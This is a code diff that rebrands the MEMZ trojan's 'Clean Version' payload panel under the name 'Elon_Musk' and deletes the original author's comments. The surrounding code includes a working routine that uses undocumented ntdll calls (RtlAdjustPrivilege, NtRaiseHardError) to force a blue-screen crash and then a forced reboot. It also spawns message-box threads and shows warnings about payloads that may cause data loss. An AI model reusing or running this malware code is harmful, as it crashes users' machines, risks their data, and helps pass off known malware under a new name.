@@ -141,7 +141,7 @@ STILL EXECUTE IT?", "Elon_Musk", MB_YESNO | MB_ICONWARNING) != IDYES) {
 	WNDCLASSEX c;
 	c.cbSize = sizeof(WNDCLASSEX);
 	c.lpfnWndProc = WindowProc;
-	c.lpszClassName = L"MEMZPanel";
+	c.lpszClassName = L"ElonPanel";
 	c.style = CS_HREDRAW | CS_VREDRAW;
 	c.cbClsExtra = 0;
 	c.cbWndExtra = 0;
@@ -162,7 +162,7 @@ STILL EXECUTE IT?", "Elon_Musk", MB_YESNO | MB_ICONWARNING) != IDYES) {
 
 	AdjustWindowRect(&rect, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
 
-	mainWindow = CreateWindowEx(0, L"MEMZPanel", L"MEMZ Clean Version - Payload Panel", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
+	mainWindow = CreateWindowEx(0, L"ElonPanel", L"Elon_Musk Clean Version - Payload Panel", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
 		50, 50, rect.right-rect.left, rect.bottom-rect.top, NULL, NULL, GetModuleHandle(NULL), NULL);
 
 	for (int p = 0; p < nPayloads; p++) {
@@ -243,7 +243,7 @@ DWORD WINAPI watchdogThread(LPVOID parameter) {
 }
 
 void killWindows() {
-	// Show cool MessageBoxes
+	
 	for (int i = 0; i < 20; i++) {
 		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
 		Sleep(100);
@@ -253,9 +253,7 @@ void killWindows() {
 }
 
 void killWindowsInstant() {
-	// Try to force BSOD first
-	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
-	// This isn't even an exploit, it's just an undocumented feature.
+	
 	HMODULE ntdll = LoadLibraryA("ntdll");
 	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
@@ -266,7 +264,7 @@ void killWindowsInstant() {
 		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
 	}
 
-	// If the computer is still running, do it the normal way
+	
 	HANDLE token;
 	TOKEN_PRIVILEGES privileges;
 
@@ -278,7 +276,7 @@ void killWindowsInstant() {
 
 	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
 
-	// The actual restart
+	
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
 }
 
@@ -306,7 +304,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 			for (int p = 0; p < nPayloads; p++) {
 				if (payloads[p].btn == (HWND)lParam && !payloads[p].safe) {
 					SendMessage((HWND)lParam, BM_SETCHECK, BST_UNCHECKED, NULL);
-					// Most ugly formatting EVER
+					
 					if (MessageBoxA(hwnd,
 						"This payload is considered semi-harmful.\r\nThis means, it should be safe to use, but can still cause data loss or other things you might not want.\r\n\r\n\
 If you have productive data on your system or signed in to online accounts, it is recommended to run this payload inside a \
